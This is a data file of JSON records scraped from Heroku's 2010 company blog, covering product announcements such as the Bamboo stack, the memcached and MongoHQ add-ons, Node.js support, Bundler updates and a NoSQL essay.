{"website": "Heroku", "title": "Public Beta: Deployment Stacks", "author": ["Oren Teich"], "link": "https://blog.heroku.com/public_beta_deployment_stacks", "abstract": "Public Beta: Deployment Stacks Posted by Oren Teich March 05, 2010 Listen to this article Heroku Apps run on a fully curated stack with everything from the front end caching to the base libraries selected and managed.  Today, we’re making available an additional curated stack, with updated libraries and Ruby VMs.  You now have the choice of running on the original “Aspen” stack, or using the new “Bamboo” stack.  Both are first class citizens and the choice on which to use is yours to make. With a single simple command, you can migrate existing apps back and forth between stacks, or deploy new apps to this updated stack.  Best of all, as part of the new stack, you also have a choice of Ruby VM between Ruby REE 1.8.7 and Ruby MRI 1.9.1.  And yes, you can run Rails 3 too! $ heroku stack\n  aspen-mri-1.8.6\n* bamboo-ree-1.8.7\n  bamboo-mri-1.9.1 We’re excited about expanding the options and programs developers can deploy to Heroku.  The existing Aspen stack & Ruby 1.8.6 remains fully supported; you can deploy new apps to either stack, and migrate back and forth.  To get started today check out the docs . We’re releasing the new stack as a public beta to solicit feedback from a larger audience.  As a public beta, all accounts are already enabled for this feature.  We look forward to hearing from you.", "date": "2010-03-05,"},
{"website": "Heroku", "title": "Heroku Casts: Queue Depth & New Relic", "author": ["Oren Teich"], "link": "https://blog.heroku.com/heroku_casts_queue_depth_new_relic", "abstract": "Heroku Casts: Queue Depth & New Relic Posted by Oren Teich March 08, 2010 Listen to this article New Relic RPM is an on-demand performance management solution for web applications developed in Ruby.  New Relic recently introduced an updated agent .  Some of the highlights include support for Sinatra and rack apps, as well as background workers. They also added a great Heroku feature; you can now view your backlog depth history.  When a request comes in to Heroku it’s passed to your dynos to process the request.  If more requests are coming in than your dynos can handle, the requests queue up.  Our docs provide a more detailed overview of performance. The queue is often a sign that you need to increase your dynos or speed up your app.  New Relic can now show you the peak and average queue for your app. This screencast provides an overview of the new feature in New Relic, and some guidance on how to tell when it’s time to crank your dynos.", "date": "2010-03-08,"},
{"website": "Heroku", "title": "Memcached Public Beta", "author": ["Oren Teich"], "link": "https://blog.heroku.com/memcached_public_beta", "abstract": "Memcached Public Beta Posted by Oren Teich March 16, 2010 Listen to this article The top open request from our recent survey has been for memcached.  Memcached is a simple, fast and  scalable in-memory object caching system. Dynamic web applications use memcached to store frequently used data, reducing database load. The Heroku memcached add-on is built on the NorthScale distribution of memcached ( NorthScale Memcached Server ) which includes an advanced, per-user security model. The service is fully managed by NorthScale – a company formed and run by leaders of the memcached open source project. All Heroku users can use the add-on today.  Read the docs for full details on getting started and add away .  We’ll be using this beta period to analyze usage, determine final pricing, and collect user feedback.  We are aiming for a late April full release of the add-on.", "date": "2010-03-16,"},
{"website": "Heroku", "title": "Sinatra 1.0 Released", "author": ["Oren Teich"], "link": "https://blog.heroku.com/sinatra_1_0_released", "abstract": "Sinatra 1.0 Released Posted by Oren Teich March 24, 2010 Listen to this article Sinatra is one of our favorite frameworks at Heroku.  Many of our apps use Sinatra, and Blake even works here.  All this means we’re extremely excited to congratulate the Sinatra team on the 1.0 release! You can use Sinatra 1.0 today on Heroku.  It works with both the Aspen and Bamboo stacks .  Simply add the gem to your .gems file, git push, and you’ll be running Sinatra 1.0!", "date": "2010-03-24,"},
{"website": "Heroku", "title": "SSL Hostname Add-on Public Beta", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/ssl_hostname_add_on_public_beta", "abstract": "SSL Hostname Add-on Public Beta Posted by Morten Bagai March 30, 2010 Listen to this article Ever since we launched the current IP-based solution at $100/month in response to customer demand, we have been pursuing a cheaper and more elegant solution for SSL with custom certificates on Heroku. Today, we’re happy to announce the public beta of a new SSL add-on that accomplishes this goal. It’s called ssl:hostname , and is priced at $20/month. This new add-on will allow you enable SSL traffic to your application on any subdomain, such as www.mydomain.com or secure.mydomain.com, using your own SSL certificate. Note that this is a paid beta, and you will be charged for using the add-on through the beta period. Full docs are available here . You can install it via the heroku gem, or directly from the Add-ons Catalog . ssl", "date": "2010-03-30,"},
{"website": "Heroku", "title": "Supporting Large Data: Part 1", "author": ["Oren Teich"], "link": "https://blog.heroku.com/supporting_big_data_part_1", "abstract": "Supporting Large Data: Part 1 Posted by Oren Teich April 21, 2010 Listen to this article As apps have matured on Heroku, data sets have gotten much larger. Taps is designed to help development by providing a fast and easy way to transfer databases between local environments and Heroku.  Today we launched taps 0.3 with a reworked architecture and a new set of features focused on large data sets: Push/Pull Specific Tables You can now choose which tables to push and pull.  Specify a regex and taps will only push or pull the tables that match.  To only pull specific tables, specify a comma delimited list.  For example, to pull the logs and tags tables, run this command: heroku db:pull --tables logs,tags Resume Transfers Interruptions can happen when moving large datasets.  Now when you interrupt (Ctrl-C) or an error occurs, taps will dump a session file that can be used to resume the transfer: heroku db:pull --resume-filename session_file.dat More Robust Schema Translation DB operations are now 100% powered by Sequel , making taps capable of handling more varied data and schemas. Improved Transfer Speed Taps now uses primary keys to move large data sets with constant transfer speed regardless of table size. Taps will fall back to ‘paging’ the data ( OFFSET + LIMIT ) if no primary key is available. Run “sudo gem update heroku taps” to get the new version.", "date": "2010-04-21,"},
{"website": "Heroku", "title": "Update & Roadmap", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/update_and_roadmap", "abstract": "Update & Roadmap Posted by James Lindenbaum April 27, 2010 Listen to this article It’s been a great first quarter for us, and it’s time for a brief update on where we are and where we’re headed. Growth Heroku’s growth has continued to be huge.  1,500 new apps were deployed to Heroku last week alone, and that number increases every week.  Next week we will cross the 60,000 application mark. As you can imagine, traffic is growing even more quickly, serving billions of requests per month.  In fact, traffic has grown by 4x over the last four months: Many are finding great value in the platform and paying for features and scale.  Our customer count and revenue have similar growth curves. Roadmap Where is Heroku’s platform going next?  How can you plan for our next releases or influence our direction? When we launch new features, what’s the best way to think about how they fit into our overall strategy? Here’s how we think about our roadmap and decide on big new areas to work on: it’s all about use cases. We started with the simplest use case: making it drop-dead easy for developers to deploy applications, and have grown into more complex ones (like multi-tier complex composite apps ). We continue to try and expand the number of use cases that we provide a complete solution for. Here’s a brief look at our historical roadmap from the perspective of expanding use cases: Provisionless Deployment. Instant deployment with the now famous “git push heroku master” is at the heart of Heroku, enabling the basic use case: a frictionless application platform that just works. Caching and Instant Scaling. We introduced high-speed HTTP caching built into every app, and added dynos which can be scaled up and down instantly, enabling large scale and variable scale apps. Asynchronous Patterns. We added background processing with Delayed::Job , followed shortly by workers which can be scaled up and down just like dynos, enabling many use cases around modern asynchronous architecture. Platform Extensibility. We launched the Add-ons system , a way to extend Heroku apps with core functionality like full-text search or memcache , and to consume external services like New Relic , Zerigo , or Sendgrid .  Use cases here are literally endless.  Add-ons allow the growing ecosystem of startups and established companies building cloud services to add new features to our platform – many more than we could do on our own. Flexible Runtime. We recently introduced deployment stacks , which enable choice between multiple runtime environments. What’s Next? Over the next days, weeks, and months, we will release new features that continue to expand the number of use cases supported by Heroku, whether for startups or large enterprises . You can be sure that each time we build a feature we will be maniacally focused on simplicity and developer productivity, and will always try to maintain the cohesiveness and quality of the platform. From our core focus on developer productivity and frictionless deployment, we’ll be expanding the footprint to include areas like realtime and event-driven apps, more complex multi-tier applications, and a broader platform for deploying advanced applications.  Stay tuned, and let us know where you’d like to see us go. news", "date": "2010-04-27,"},
{"website": "Heroku", "title": "Experimental Node.js Support", "author": ["Blake Mizerany"], "link": "https://blog.heroku.com/node_js_support_experimental", "abstract": "Experimental Node.js Support Posted by Blake Mizerany April 28, 2010 Listen to this article UPDATE : Node.JS is now officially available on Heroku. Today we’re offering experimental support for node.js to a limited set of users.  We know there is a lot of demand, and will work with as many users as we can.  See below for details. A natural complement to Ruby Yesterday we posted about how we think about the platform and make roadmap decisions .  We are always looking for the next set of use cases to support, and lately we’ve been thinking about realtime apps and event-driven architectures. Today, most Ruby apps are synchronous. By default, all I/O blocks.  If you’re uploading a file, polling a service, or waiting on data, your app will be blocked. While it’s possible to fix this by meticulously eliminating all blocking I/O from your code and dependencies, and using a library such as EventMachine, it’s tedious and as Adam points out: “Libraries like eventmachine will never be truly intuitive to use, because event-driven I/O is enough of a fundamental shift that it requires deep language integration.  JavaScript, it turns out, is a fundamentally event-driven language because of its origins in the browser” Node.js is evented I/O for JavaScript, built on top of the blazingly fast V8 engine . It makes handling event-driven I/O incredibly simple, and aligns perfectly with our maniacal focus on simplicity and developer productivity. The Ruby community has quickly adopted node, and with great reason. Complimenting existing apps with node.js for components that require real-time event handling or massive concurrency is both easy and elegant – in part thanks to the availability of frameworks such as express . Simple to use Node fits well into our existing architecture. It’s just another runtime selectable as part of our stacks : Open Questions Supporting node opens many questions on the platform: how are we going to charge, what version will we support, how can I integrate it with my current apps?  We’re releasing this in experimental state now to collaborate with the Node.js and Ruby communities on this.  Over the next months we will work together to provide answers to all these questions and more. How to Participate If you want to participate and use node on an experimental basis, drop an email to nodejs@heroku.com with your email address, what you want to use Node for, and we’ll work to include you in the program.", "date": "2010-04-28,"},
{"website": "Heroku", "title": "Node.js Feedback", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/node_js_feedback", "abstract": "Node.js Feedback Posted by Morten Bagai April 29, 2010 Listen to this article The response to yesterday’s Node.js announcement continues to be absolutely amazing. First and foremost, we’re thrilled to see the community share our excitement about Node.js and its potential on the Heroku platform. We do, however, also want to be mindful that we’re still in the experimental phase with this technology here. For this reason, we’re going to proceed carefully and invite testers in small batches. So, if you don’t hear from us right away, despair not. It’ll likely take us a few weeks to get through the current list, and if you’re reading this for the first time, please don’t hesitate to register your interest at nodejs@heroku.com.", "date": "2010-04-29,"},
{"website": "Heroku", "title": "MongoHQ Add-on Public Beta", "author": ["Oren Teich"], "link": "https://blog.heroku.com/mongohq_add_on_public_beta", "abstract": "MongoHQ Add-on Public Beta Posted by Oren Teich April 30, 2010 Listen to this article Let’s cut straight to the chase: MongoHQ is launching their add-on to all Heroku users as a public beta. The details Over the last six months we have seen persistent demand for MongoDB support on Heroku, so we are incredibly excited that MongoHQ is releasing their highly anticipated add-on into public beta today. The add-on interfaces seamlessly with their successful hosted service, and allows developers to use MongoDB as a first-class-citizen data store in any of their Heroku apps. Using it is just as easy as you’ve come to expect from Heroku: simply add the add-on, and you’re good to go! The first available plan is free and includes one database up to 16MB.  Soon, you will have your pick of the full range of MongoHQ plans . Getting Started Add the add-on to your app: $ heroku addons:add mongohq:free This will create a fresh new MongoHQ database for you and set the proper environment variable in your app.  Follow the detailed instructions in our MongoHQ docs page for specifics on using MongoDB in your app. Transferring data in/out Since MongoDB isn’t a SQL database, taps won’t work.  Luckily Pedro has created a Heroku client plugin that offers you push/pull functionality to a MongoDB.  If you have MongoDB running locally on your development machine, with this plugin you can easily push and pull data just like with taps. If you have any questions using the MongoHQ add-on, or any Heroku add-on, our support staff is available.", "date": "2010-04-30,"},
{"website": "Heroku", "title": "Ignition!", "author": ["Byron Sebastian"], "link": "https://blog.heroku.com/ignition", "abstract": "Ignition! Posted by Byron Sebastian May 10, 2010 Listen to this article We can’t be happier to announce that we recently closed a $10 million Series B round of investment led by Ignition Partners. We’re planning to use the money to further expand our platform , turbo-charge partner programs for add-on providers and consultancies, and accelerate our go-to-market programs. The growth and excitement that we’ve seen at Heroku, particularly in 2010, has been incredibly energizing for all of us. We talk a lot about numbers – the 60,000-plus apps running on our platform gets quoted a lot recently – but even more motivating are the creative forces that the platform is unleashing. Developers and companies are building and running some amazing apps with our platform (check out the United Nations app ProtectedPlanet.net for one of my recent favorites). Ruby on Rails consultants are growing their businesses and creating happier customers. Technology vendors are building some very cool extensions to our platform as part of the Add-on system . In other words, creating an open, efficient, and reliable platform that upends the status quo is not just about technology: it’s about resources and support for developers, making it easy for partners to use the platform for their own customers, and enabling technology partners to build businesses by extending the platform itself. It’s also about having a great team. We can’t be prouder of the team we’re building at Heroku (if you might be interested in joining, please check out jobs.heroku.com ), and the team just got stronger: John Connors of Ignition has joind our board. John is a super-smart, super-seasoned executive with a wealth of experience (including stints as CIO and CFO at Microsoft) that we’ve already begun to draw on as we plan what’s next for Heroku. We’d like to take this moment to thank all of you for your support. We’ll take full advantage of the additional resources and expertise joining us today to serve you in the future. Official news release here . news", "date": "2010-05-10,"},
{"website": "Heroku", "title": "Rails 2.3.6+ Dependency Issues", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/rails_2_3_6_dependency_issues", "abstract": "Rails 2.3.6+ Dependency Issues Posted by Morten Bagai May 25, 2010 Listen to this article This past Sunday, Rails 2.3.6 was released , and quickly followed by 2.3.7 and 2.3.8.  One of the major changes in these new versions is to require a newer version of Rack, specifically 1.1.0, that is incompatible with Rails 2.3.5 and older.  Due to the fairly complex ways in which Rubygems resolves dependencies, this can prevent your app from starting – in your local environment as well as when deployed on Heroku. If you’ve been affected by this issue, you would see this error message: Missing the Rails gem. Please `gem install -v= x.x.x`,\n    update your RAILS_GEM_VERSION setting in config/environment.rb \n    for the Rails version you do have installed, or \n    comment out RAILS_GEM_VERSION to use the latest \n    version installed. We have written up a new docs page page with information detailing the issue, how to reproduce on your local machine, and how to resolve it. rails", "date": "2010-05-25,"},
{"website": "Heroku", "title": "Apigee Add-on for Twitter Public Beta", "author": ["Morten Bagai"], "link": "https://blog.heroku.com/apigee_add_on_for_twitter_public_beta", "abstract": "Apigee Add-on for Twitter Public Beta Posted by Morten Bagai May 27, 2010 Listen to this article If you develop apps for Twitter, this is the add-on for you.  The Apigee for Twitter Add-on allows developers to easily access Twitter REST api’s.  Through a direct relationship with Twitter, Apigee can offer users of the Add-on vastly increased rate limits automatically.  The goal is to ensure that no valid application hits rate limits at all. If you’re developing applications using the Twitter REST api, check out the add-on today.  Using it is often as simple as changing your app to use the apigee provided config var endpoint instead of “api.twitter.com”. Full docs are available here , and as always please let us know how it works for you.", "date": "2010-05-27,"},
{"website": "Heroku", "title": "Rails 3 Beta 4 on Heroku", "author": ["Oren Teich"], "link": "https://blog.heroku.com/rails_3_beta_4_on_heroku", "abstract": "Rails 3 Beta 4 on Heroku Posted by Oren Teich June 15, 2010 Listen to this article Heroku now supports Rails 3 beta 4 with Ruby 1.8.7.  Make sure to push up to bamboo , and you should be all set! As Rails 3 matures and gets closer to production a number of pieces continue to change.  The beta 4 update introduced two significant changes to be aware of: Require Ruby 1.8.7 > p249 or Ruby 1.9.2. Require Bundler 0.9.26. Heroku has updated to Ruby REE 1.8.7-2010.02 which incorporates the necessary patches for Rails 3.  We will add support for 1.9.2 when the community releases the official release.  In the meantime, developers interested in using Rails 3 on Heroku must use Ruby 1.8.7. We have also updated to the latest stable release of Bundler: 0.9.26.  We will continue to track the evolution of bundler through their 1.0 release.  Due to thousands of applications that have already adopted bundler on Heroku, each update must be carefully tested to ensure that we don’t disrupt ongoing application operation.", "date": "2010-06-15,"},
{"website": "Heroku", "title": "Default to Bamboo ", "author": ["Oren Teich"], "link": "https://blog.heroku.com/default_to_bamboo", "abstract": "Default to Bamboo Posted by Oren Teich June 29, 2010 Listen to this article Deployment stacks have been a huge success.  For many developers, heroku create —stack bamboo has become the default whenever creating new apps.  With the latest version of Rails 2 and Rails 3 both requiring the Bamboo stack, we’re excited to make Bamboo the new default. Effective immediately, all newly created apps will default to the bamboo stack with REE 1.8.7.  You can still use the old aspen stack if you’d like by simply specifying `heroku create —stack aspen`.  Existing apps stay on the stack they are on unless you explicitly migrate them . A key feature of bamboo is to eliminate pre-installed gems.  This provides app developers with considerably more flexibility in managing their apps.  You can easily use any version of any gem by simply including it in your .gems file or Bundler Gemfile .  You’ll need to remember to include all gems you are using.  If you’re using Gemfile, this is automatically done for you.  If you’re using .gems, please make sure to include all the gems you use, INCLUDING rails!", "date": "2010-06-29,"},
{"website": "Heroku", "title": "NoSQL, Heroku, and You", "author": ["Adam Wiggins"], "link": "https://blog.heroku.com/nosql", "abstract": "NoSQL, Heroku, and You Posted by Adam Wiggins July 19, 2010 Listen to this article Why NoSQL Matters “NoSQL” is a label which encompasses a wave of innovation now happening in the database space.  The NoSQL movement has sparked a whirlwind of discussion, debate, and excitement in the technical community.  Why is NoSQL generating so much buzz?  What does it mean for you, the application developer?  And what place does NoSQL have for apps running on the Heroku platform? SQL (the language) and SQL RDBMS implementations (MySQL, PostgreSQL, Oracle, etc) have been the one-size-fits-all solution for data persistence and retrieval for decades.  The rise of the web and the LAMP stack cemented the role of the relational database.  But in 2010 we see a variety of application needs which are not satisfied by MySQL and friends.  New problems demand new tools.  High availability, horizontal scaling, replication, schemaless design, and map/reduce capability are some of the areas being explored by a new crop of datastores, all of which are loosely categorized as NoSQL. To understand why NoSQL is important to you as an app developer, let’s consider the use cases for some of these features: Frequently-written, rarely read statistical data (for example, a web hit counter) should use an in-memory key/value store like Redis , or an update-in-place document store like MongoDB . Big Data (like weather stats or business analytics) will work best in a freeform, distributed db system like Hadoop . Binary assets (such as MP3s and PDFs) find a good home in a datastore that can serve directly to the user’s browser, like Amazon S3 . Transient data (like web sessions, locks, or short-term stats) should be kept in a transient datastore like Memcache .  (Traditionally we haven’t grouped memcached into the database family, but NoSQL has broadened our thinking on this subject. ) If you need to be able to replicate your data set to multiple locations (such as syncing a music database between a web app and a mobile device), you’ll want the replication features of CouchDB . High availability apps, where minimizing downtime is critical, will find great utility in the automatically clustered, redundant setup of datastores like Cassandra and Riak . Despite all the use cases described above, there will always be a place for the highly normalized, transactional, ad-hoc-query capabilities of SQL databases.  We’re adding new tools to our toolbox, not removing old ones. Polyglot Persistence – or, How Do You Pick a NoSQL Datastore? Part of the NoSQL message is: pick the right tool for the job.  The use cases outlined above should help guide your choice of datastore, as will many resources around the web like this diagram , these slides , or this video .  And, like any technology, you should pick something that feels right for you and your team. But most apps encompass multiple use cases.  How do you pick one database to handle all the types of data your app needs to deal with?  NoSQL answers: you don’t have to pick just one.  This concept is called polyglot persistence (more details) . For example, we can imagine a web app which uses four different datastores: MySQL for low-volume, high-value data like user profiles and billing information MongoDB for high-volume, low-value data like hit counts and logs Amazon S3 for user-uploaded assets like photos and documents Memcached for temporary counters and rendered HTML Polyglot persistence also makes it easy to dip your toes into NoSQL.  Don’t migrate your existing production data – instead, use one of these new datastores as a supplementary tool.  (Example: put non-critical session data or stats into Redis or Tokyo Tyrant.)  And if you’re starting on a new app, you should give serious consideration to NoSQL options for your primary datastore, in addition to the venerable SQL choices. NoSQL and the Cloud The SQL databases we’re using today were designed over a decade ago.  They were written with the constraints of 1990s hardware in mind: storage is cheap, memory and cpu are expensive.  Today’s machines have different parameters.  Memory and CPU are cheap, and can easily be scaled up on demand without capital expenditure using a service like Amazon EC2.  But EC2, like all cloud technology, is based on virtualization.  Virtualization’s weakness is I/O performance.  So, the constraints of disk and memory have swapped: disk is the weak link in the chain, memory and cpu (spread out horizontally) are the strong links.  It’s not surprising, then, that the datastores built a decade ago aren’t a good fit for the new parameters of cloud computing. NoSQL databases tend to use memory over disk as the first-class write location: Redis and Memcached are in-memory only, and even systems like Cassandra use memtables for writes with asynchronous flushing to disk, preventing inconsistent I/O performance from creating write speed bottlenecks.  And since NoSQL datastores typically emphasize horizontal scalability via partitioning, this puts them in an excellent position to take advantage of the elastic provisioning capability of cloud.  NoSQL and cloud are a natural fit. Database-as-a-Service is the Future Infrastructure-as-a-service like Amazon EC2 and Rackspace Cloud are what most of us think of as “cloud.”  One of the effects of these large public clouds is that apps now have extremely low latency between themselves and other apps or service providers – 1ms or less compared to 50ms+ on the open internet.  This latency difference opens up vast new possibilities for what a 3rd party service provider can offer. Database-as-as-service is one of the coming decade’s most promising business models.  Already services like MongoHQ (MongoDB), Cloudant (CouchDB), and Amazon RDS (MySQL) are offering fully hosted and managed databases to apps running in EC2.  Like IaaS, DaaS promises remove up-front capex costs, and bring efficiency of scale and specialization in the admin and operation of databases.  Although these services are still very young, the potential benefit of being able to outsource all the headaches of running and scaling your app’s database are enormous. DaaS also goes hand-in-glove with polyglot persistence.  Thanks to database services, you won’t need to learn how to sysadmin/ DBA for every datastore you use – you can instead outsource that job to a service provider specializing in each database.  One of the reasons databases have historically had a tribal affiliation (someone is a “MySQL guy” or a “Postgres gal” or an “Oracle guy,” but rarely two or all three) is because of the time investment in learning how to admin whatever database you use.  DaaS removes that barrier and opens up even greater possibility for polyglot persistence in production use. Heroku’s Commitment to Database Innovation Heroku already supports two of the most popular NoSQL databases, MongoDB and CouchDB, as add-ons: MongoHQ and Cloudant .  We also support the transient key-value datastore, Memcache , via Northscale ’s service. Looking forward to the future: we have more NoSQL add-ons coming down the pipeline, such as Redis To Go .  And we’ll be continuing to work with technology leaders in the NoSQL community to help them bring their database services to market.  Our goal is to provide access to the cornucopia of breakthrough new database technologies from the NoSQL world, available from the Heroku add-ons catalog at the click of a button.  We hope to make Heroku a great place to play with these new technologies, while still curating a list of options that are fully baked and ready for use in real production applications. Of course, we can’t forget that Heroku currently runs the largest and most mature SQL -database-as-a-service in the world: our PostgreSQL service, packaged with every Heroku app.  We’re continuing to expand and improve this service (including support for great new features in Postgres 9), because we know SQL and the apps that depend on it are here to stay.  Reinforcing our commitment to polyglot persistence, we’ll be turning our Postgres service into a separately packaged add-on – still installed by default into each app, but possible to opt out, or combine with other datastore add-ons.  We also hope to see other providers in the SQL -as-a-service space besides Heroku’s Postgres service and Amazon RDS . It’s an exciting time for data, and our team here at Heroku is thrilled to take part in the continuing growth of the NoSQL movement.", "date": "2010-07-19,"},
{"website": "Heroku", "title": "Blasting through Brazil", "author": ["Oren Teich"], "link": "https://blog.heroku.com/blasting_through_brazil", "abstract": "Blasting through Brazil Posted by Oren Teich August 02, 2010 Listen to this article Our own Brazilian Pedro Belo will be making two stops in Brazil the first half of August.  August 6th and 7th he’ll be speaking at the Oxente Rails 2010 conference.  On August 8th he’ll be joining a local meetup in Sao Paulo to talk Ruby, Heroku and Beer. If you’d like to join the meetup in São Paulo, drop Pedro a note for the location details.  Ansioso para vê-lo!", "date": "2010-08-02,"},
{"website": "Heroku", "title": "Bundler Status Update", "author": ["Oren Teich"], "link": "https://blog.heroku.com/bundler_status_update", "abstract": "Bundler Status Update Posted by Oren Teich August 12, 2010 Listen to this article Bundler is quickly shaping up to meet all it’s promise as THE best way to manage your application dependencies.  This afternoon we updated Heroku to the latest version – 1.0.0RC5.  RC5 addresses all known outstanding issues including the git sourced gems .  You can see a full changelog on github . One key problem Bundler was designed to address was the shifting sands of various gems updating and changing dependencies.  As many of you have probably found in the past before Bundler, deploying could unexpectedly install new versions of gems on you, breaking your application.  Bundler has added a new flag: “—deployment” for this very issue. When you run “bundle install” on your local development machine, Bundler will automatically create a Gemfile.lock file.  The lock file includes a pinned version of all of your gem dependencies, for all groups.  When the deploy process then uses the —deployment flag, the installation will only install the version of gems that are listed in the Gemfile.lock, which was generated on your development machine.  This ensures that even your dependent gems change, the dependencies on the dependencies change, etc, you won’t be surprised by updating to a different version than you tested against. To work, the —deployment flag requires that you have a Gemfile.lock.  Currently, Heroku runs “bundle install” against your application if you don’t have a Gemfile.lock, and “bundle install —deployment” if you do.  Starting next month, we will begin to use the —deployment flag 100% of the time.  This means you must commit a Gemfile.lock to your git repo.  Simply run bundle install locally, git add your Gemfile.lock, and you’ll be all set for the future.", "date": "2010-08-12,"},
{"website": "Heroku", "title": "Social App Workshop Videos", "author": ["Oren Teich"], "link": "https://blog.heroku.com/social_app_workshop_videos", "abstract": "Social App Workshop Videos Posted by Oren Teich August 20, 2010 Listen to this article Last month’s Social App Workshop was a huge success.  With a sold out crowd of over 150 people filling the basement of our new office, a great lineup of presenters and some fun coding in the afternoon it surpassed our expectations.  Social App Workshop is a hacker event for new and experienced developers working on Twitter & Facebook apps. With a combination of presentations and coding the workshop brings developers together to work on social apps. The morning was spent with a combination of 10 min talks and 30 min talks from Facebook , Twitter , Heroku , Apigee , Twilio , and Abraham Williams .  After getting everyone amped up in the morning, we broke into groups in the afternoon to code up fun projects.  Projects ranged from sample apps using oauth for twitter to a wake up call service for travelling moms. If you weren’t able to make it, we’ve posted all the videos of the talks and embedded them below as well. We’re working with Dave Nielsen to hold additional Social App Workshops, both here in San Francisco as well as around the world.  If you have ideas or would like to see this type of event in your town, leave us a comment and let us know!", "date": "2010-08-20,"},
{"website": "Heroku", "title": "Enterprise Social Apps", "author": ["Oren Teich"], "link": "https://blog.heroku.com/enterprise_social_apps", "abstract": "Enterprise Social Apps Posted by Oren Teich August 31, 2010 Listen to this article With over 80,000 applications on Heroku, we are frequently asked what type of apps people are building.  While there’s a wide range , one of the areas I’ve been most excited about is social apps.  We have thousands of social applications around Twitter, Facebook, and other platforms.  The Social App Workshop last month was proof of the interest with a sold out crowd of over 150 people filling a basement on a great summer Saturday. Social platforms are sweeping enterprises as well.  From internal communities for collaboration to external communities with millions of users, enterprises are finding social software essential to how they work. Today we’re announcing a partnership with the leader in this space – Jive Software . Over 3,000 leading companies, including over 25% of the Fortune 100, use the Jive platform to engage their employees, customers and partners. If you are interested in building social applications for the enterprise and reaching millions of employees, we have a great opportunity for you. For the first time, Jive is opening up their platform to 3rd party application developers. Their new Jive Apps Market will make it easy for customers using the Jive platform to purchase cloud-based social app software. You’ll be able to deploy your applications to Heroku, and have companies from around the world view, purchase, and use your app within Jive. Jive is leading the way in bringing cloud social business applications into the enterprise, and we’re honored to be part of it. To help you get started, Jive is holding their first ever Jive Apps Developer Event on September 16th at the San Francisco InterContinental Hotel.  This is a great opportunity to both evaluate the size of the Jive Apps opportunity by mingling with enterprise customers as well as get the technical details from Jive engineers. Jive and Heroku have teamed up to offer 10 free passes to the event. If you’d like to enter to win one of the passes, fill out this survey before Sept 2nd.", "date": "2010-08-31,"},
{"website": "Heroku", "title": "Announcing the Add-on Provider Program", "author": ["James Lindenbaum"], "link": "https://blog.heroku.com/announcing_addon_provider_program", "abstract": "Announcing the Add-on Provider Program Posted by James Lindenbaum September 14, 2010 Listen to this article This morning we are very excited to announce our new Add-on Provider Program , which allows anyone to easily build a Heroku add-on, making it available to all Heroku developers and customers to purchase with one click. We first launched add-ons almost a year ago.  Since then, they have been hugely successful, many add-ons being purchased thousands of times. Hundreds of cloud service providers have contacted us wanting to build their own add-ons.  We’ve spent the past nine months iterating with add-on providers to create an API that’s easy to use and easy to get started with.  We’re excited to release it to you today! API and Developer Kit We have a full developer kit for building add-ons, including a provisioning API , single-sign on for tight integration into the Heroku user experience, tools for local development and testing of API calls, and a smooth, well established process for building, integrating, and testing add-ons that has been used by many of our existing providers. Resource Center We have also built a Resource Center for providers that contains an overview of the program, detailed how-to guides , sample code , reference materials, and best practices for building and operating a cloud service. Program Benefits The provider program is an excellent opportunity to build a business around a cloud service, with an easy distribution channel to all Heroku developers and customers. Some of the benefits of the program include: Make your service available to all of our developers and customers Create a detailed listing in our Add-ons Catalog Allow customers to activate your add-on instantly with one-click Manage billing, payments, and upgrades easily through our system Use our development kit for local testing of API calls Operate your cloud service with our documented best practices Alpha and beta test your add-on with our established process Get feedback from our large group of private beta testers We’re Serious about Providers We believe that the ability to consume external services from within Heroku is a critical part of being an application platform, so we have invested heavily in our add-ons system and now our provider program, and will continue to do so. Heroku is dedicated to building a neutral marketplace of cloud services. We will encourage competition, base our policies on objective metrics everywhere possible, and help to accelerate merit-based adoption of third party add-ons. With dozens of providers already working on new add-ons and hundreds getting started today, we are very excited about providing a high-quality, self-service program for providers. If you have any questions about the new program or need help getting started, please feel free to contact the add-ons team . Customer Feedback Our primary interest in add-ons is the tremendous value they can deliver to Heroku users.  We want to hear as much feedback as possible from our users and customers about add-ons.  We are building some great tools to make it easy for customers to share feedback and requests with us and with our providers. Have a review of a particular provider?  Have a service you would like to see an add-on for? Let us know! Official press release here . news", "date": "2010-09-14,"},
{"website": "Heroku", "title": "An update on Heroku Node.js support", "author": ["Oren Teich"], "link": "https://blog.heroku.com/an_update_on_heroku_node_js_support", "abstract": "An update on Heroku Node.js support Posted by Oren Teich September 20, 2010 Listen to this article UPDATE : Node.JS is now officially available on Heroku. In April we released experimental support for Node.js .  Response was instant and overwhelming.  Now, nearly 1,000 people are using Node.js on Heroku. The goal of the experiment was to understand what it would take to run Node.js in the most Heroku way possible.  The experiment was extremely successful.  People have built great apps, provided feedback, and engaged in ways beyond our expectations.  Three of the key requests we’ve heard are: Support for long connections, beyond a 30 second timeout HTTP 1.1 and websockets Scaling Node.js as easily as Ruby While we work on the next version incorporating these features and more, we are closing the Node.js experimental release to new users.  All existing users will continue to have access to the Node.js experimental release. To those of you who have used our Node.js support and provided feedback, thank you!  For those on the waiting list, you’ll be first on the list for the next version next year.", "date": "2010-09-20,"},
{"website": "Heroku", "title": "Who wants a HUG?", "author": ["Ben Scofield"], "link": "https://blog.heroku.com/who_wants_a_hug", "abstract": "Who wants a HUG? Posted by Ben Scofield October 01, 2010 Listen to this article It’s no secret that Heroku’s getting pretty big. Heck, we advertise the number of apps running on the platform right there on the homepage (over 88,000, when I last looked). We’ve got tens of thousands of developers, and you all have been doing some amazing work — the success stories we’ve posted are only the tip of the iceberg. With that in mind, we thought it was high time we started to get all of you together. So, on November 3rd, we’re going to hold the first official Heroku Users Group meeting. Join us at our office at 7pm to meet other Heroku users and engineers, hear war stories from the front lines, learn tips and tricks, and ask those burning questions that you’ve been holding on to for months. We’re still working out the details, but rest assured it’ll be great. We’ll bring the knowledge (and the food, and whatever else is needed). You just need to let us know that you’re coming . news", "date": "2010-10-01,"},
